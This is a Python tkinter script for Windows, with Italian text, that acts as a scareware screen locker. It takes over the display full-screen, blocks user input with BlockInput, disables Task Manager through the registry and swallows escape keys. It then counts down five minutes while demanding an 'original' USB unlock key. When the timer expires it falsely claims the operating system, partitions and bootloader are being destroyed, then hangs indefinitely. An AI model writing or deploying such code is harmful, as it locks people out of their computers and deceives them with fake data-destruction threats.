import tkinter as tk
import os
import time
import winsound
import sys
import ctypes
import threading
import subprocess
import string

# ================= CONFIGURAZIONE =================
SECRET_KEY = "MY_SECRET_PASSWORD"  # ?? DEVE ESSERE UGUALE AL FILE!
COUNTDOWN_TIME = 300               # 5 minuti
DESTRUCTION_TIME = 60              # 1 minuto di distruzione
# ==================================================

# Variabili globali
countdown = COUNTDOWN_TIME
is_destroying = False

# ?? Trova il file di sblocco su qualsiasi unit�
def find_unlock_file():
    for drive_letter in string.ascii_uppercase:
        drive = f"{drive_letter}:\\"
        unlock_path = os.path.join(drive, "unlock.key.txt")
        
        if os.path.exists(drive) and os.path.exists(unlock_path):
            try:
                with open(unlock_path, 'r') as f:
                    content = f.read().strip()
                    if content == SECRET_KEY:
                        return True, drive
            except:
                continue
    return False, None

# ?? Blocco completo sistema
def disable_system():
    try:
        # Blocca input utente
        ctypes.windll.user32.BlockInput(True)
        
        # Disabilita Task Manager
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 
                       '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'], 
                      capture_output=True, shell=True)
    except:
        pass

# ?? Riabilita sistema
def enable_system():
    try:
        ctypes.windll.user32.BlockInput(False)
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 
                       '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'], 
                      capture_output=True, shell=True)
    except:
        pass

# ?? Sequenza di distruzione
def destroy_system():
    global is_destroying
    if not is_destroying:
        is_destroying = True
        destruction_label.config(text="?? RIMOZIONE SISTEMA OPERATIVO IN CORSO ??")
        
        def destruction_sequence():
            messages = [
                "Analisi strutture di sistema...",
                "Eliminazione file critici...",
                "Corruzione partizioni...",
                "Cancellazione bootloader...",
                "Sovrascrittura settori disco...",
                "?? SISTEMA OPERATIVO RIMOSSO! ??"
            ]
            
            for msg in messages:
                destruction_label.config(text=msg)
                root.update()
                winsound.Beep(800, 1000)
                time.sleep(2)
            
            destruction_label.config(text="?? SISTEMA IRRECUPERABILE - PC BLOCCATO PERMANENTEMENTE ??")
            root.attributes("-topmost", True)
            root.update()
            
            # Blocco permanente
            while True:
                time.sleep(1)
        
        threading.Thread(target=destruction_sequence, daemon=True).start()

# ?? Controllo continuo USB di sblocco
def check_unlock_usb():
    global countdown, is_destroying
    
    unlocked, drive = find_unlock_file()
    
    if unlocked:
        status_label.config(text=f"? USB DI SBLOCCO RILEVATA SU {drive}")
        root.update()
        time.sleep(2)
        enable_system()
        root.destroy()
        sys.exit(0)
    
    if countdown <= 0 and not is_destroying:
        destroy_system()
    
    root.after(1000, check_unlock_usb)

# ? Countdown
def update_countdown():
    global countdown
    if countdown > 0:
        mins, secs = divmod(countdown, 60)
        timer_label.config(text=f"? TEMPO RIMANENTE: {mins:02d}:{secs:02d}")
        countdown -= 1
        
        # Avvisi sonori
        if countdown <= 30:
            winsound.Beep(1500, 300)
        elif countdown % 60 == 0:
            winsound.Beep(1000, 500)
            
        root.after(1000, update_countdown)
    else:
        timer_label.config(text="? TEMPO SCADUTO! INIZIO DISTRUZIONE!")

# ??? Interfaccia grafica
root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg="black")
root.title("?? SYSTEM LOCK ??")
root.config(cursor="none")

# Disabilita tutti i tasti speciali
special_keys = ["<Alt-F4>", "<Control-Alt-Delete>", "<Escape>", 
                "<Alt-Tab>", "<Win>", "<Control-Escape>", "<F11>", "<F12>"]
for key in special_keys:
    root.bind(key, lambda e: "break")

# Etichette testo
label = tk.Label(root, text="?? IL TUO PC � BLOCCATO ??\n\n"
                           "INSERISCI LA CHIAVETTA USB ORIGINALE\n"
                           "PER SBLOCCARE IL SISTEMA\n\n"
                           "? TEMPO LIMITE: 5 MINUTI ?\n"
                           "? NON SPEGNERE IL COMPUTER ?",
                 fg="red", bg="black", font=("Arial", 24, "bold"), justify=tk.CENTER)
label.pack(pady=20)

timer_label = tk.Label(root, text="", fg="yellow", bg="black", font=("Arial", 20, "bold"))
timer_label.pack(pady=10)

status_label = tk.Label(root, text="?? Ricerca USB di sblocco...", fg="cyan", bg="black", font=("Arial", 16))
status_label.pack(pady=5)

destruction_label = tk.Label(root, text="", fg="orange", bg="black", font=("Arial", 18, "bold"))
destruction_label.pack(pady=20)

# ?? Avvio
disable_system()
check_unlock_usb()
update_countdown()

root.mainloop()
